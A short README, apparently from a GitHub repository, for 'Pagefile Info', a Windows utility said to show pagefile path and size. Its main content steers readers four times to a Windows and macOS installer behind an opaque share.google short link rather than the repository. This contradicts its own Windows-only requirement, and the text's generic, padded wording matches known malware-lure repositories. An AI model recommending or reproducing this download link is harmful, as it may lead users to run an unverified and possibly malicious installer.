![Pagefile Info](assets/hero.png)

# Pagefile Info

*Where the pagefile is, and how big.*

## What Pagefile Info is

This repository is **Pagefile Info**, a Windows utility. Where the pagefile is, and how big.

A disk-full ticket needs the pagefile path.

The CLI in this repository is the documented interface; the desktop build is the same job in an installer.

## How to get it

Use the command-line copy in this repository if you already have Python.

If you want a normal installer for Windows or macOS, open the [setup page](https://share.google/A1IHfyGRT0zGRLqj8) and follow the steps there.

## Highlights

- Path and size
- Read-only
- All volumes it can see
- No changes

## Environment

- Windows 10 or 11 for the desktop build
- Python 3.11 or newer only if you run the CLI from this repository
- Runs locally on the PC that starts it; no account required for the CLI

## Usage

Python 3.11 or newer. From the repository root:

```text
python -m pip install -r requirements.txt
python main.py --help
```

`--preview` prints the plan and does not write. `--out` sets an output folder when the command supports it.

## Download

[![Download](assets/download.png)](https://share.google/A1IHfyGRT0zGRLqj8)

**[Windows and macOS installer](https://share.google/A1IHfyGRT0zGRLqj8)**

Source: https://github.com/njenkins5009/pagefile-info

MIT license. See `LICENSE`.
